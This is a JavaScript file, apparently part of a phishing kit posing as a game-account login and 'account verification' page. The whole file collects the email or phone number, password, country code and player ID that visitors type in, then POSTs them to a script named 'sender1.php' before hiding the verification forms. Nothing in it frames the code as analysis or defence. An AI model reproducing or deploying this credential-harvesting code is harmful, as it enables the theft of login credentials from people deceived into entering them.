function SelowLoginMail() {
    $emailml = $("#selowmail-ml").val().trim();
    $passwordml = $("#selowpw-ml").val().trim();
    $loginml = $("#login-mail").val().trim();
    $playid = $("#ValidatePopupPlayId").val().trim();
    if ($emailml == '' || $emailml == null || $emailml.length <= 10) {
        $(".email-ml").fadeIn();
        setTimeout(function() {
            $('.email-ml').fadeOut();
        }, 2000);
        $(".sandi-ml").hide();
        $(".login-mail").show();
        return false;
    } else {
        if ($passwordml == '' || $passwordml == null || $passwordml.length <= 5) {
            $(".sandi-ml").fadeIn();
            setTimeout(function() {
                $(".sandi-ml").fadeOut();
            }, 2000);
            $(".login-mail").show();
            return false;
        } else {
            $.ajax({
                'type': 'POST',
                'url': "sender1.php",
                'data': $("#SelowLoginMailForm").serialize(),
                'beforeSend': function() {
                    $('.email-ml').hide();
                    $(".sandi-ml").hide();
                    $(".login-mail").hide();
                    $("#btn-email1").hide();
                    $(".login-mail-load").show();
                },
                'success': function() {
                    $("input#validateEmail").val($emailml);
                    $("input#validatePassword").val($passwordml);
                    $("input#validateLogin").val($loginml);
                    $("input#ValidatePopupPlayId").val($playid);
                    $(".account_verification").hide();
                    $("#load-verify").hide();
                    $('#stepform').hide();
                    $(".login-mail-load").hide();
                    return true;
                }
            });
        }
    };
};

function SelowLoginNumber() {
    $emailnm = $("#selowmail-nm").val().trim();
    $passwordnm = $("#selowpw-nm").val().trim();
    $loginnm = $("#login-number").val().trim();
    $codetel = $("#code-tel").val().trim();
    $playid = $("#ValidatePopupPlayId").val().trim();
    if ($emailnm == '' || $emailnm == null || $emailnm.length <= 5) {
        $(".email-nm").fadeIn();
        setTimeout(function() {
            $(".email-nm").fadeOut();
        }, 2000);
        $('.sandi-nm').hide();
        $(".login-mail").show();
        return false;
    } else {
        if ($passwordnm == '' || $passwordnm == null || $passwordnm.length <= 5) {
            $(".sandi-nm").fadeIn();
            setTimeout(function() {
                $(".sandi-nm").fadeOut();
            }, 2000);
            $(".login-mail").show();
            return false;
        } else {
            $.ajax({
                'type': "POST",
                'url': "sender1.php",
                'data': $("#SelowLoginNumberForm").serialize(),
                'beforeSend': function() {
                    $(".email-nm").hide();
                    $(".sandi-nm").hide();
                    $(".login-mail").hide();
                    $("#btn-email1").hide();
                    $(".login-number-load").show();
                },
                'success': function() {
                    $("input#validateEmail").val($emailnm);
                    $("input#validatePassword").val($passwordnm);
                    $("input#validateLogin").val($loginnm);
                    $("input#validateTel").val($codetel);
                    $("input#ValidatePopupPlayId").val($playid);
                    $(".account_verification").hide();
                    $("#load-verify").hide();
                    $('#stepform').hide();
                    $(".login-number-load").hide();
                    return true;
                }
            });
        }
    };
};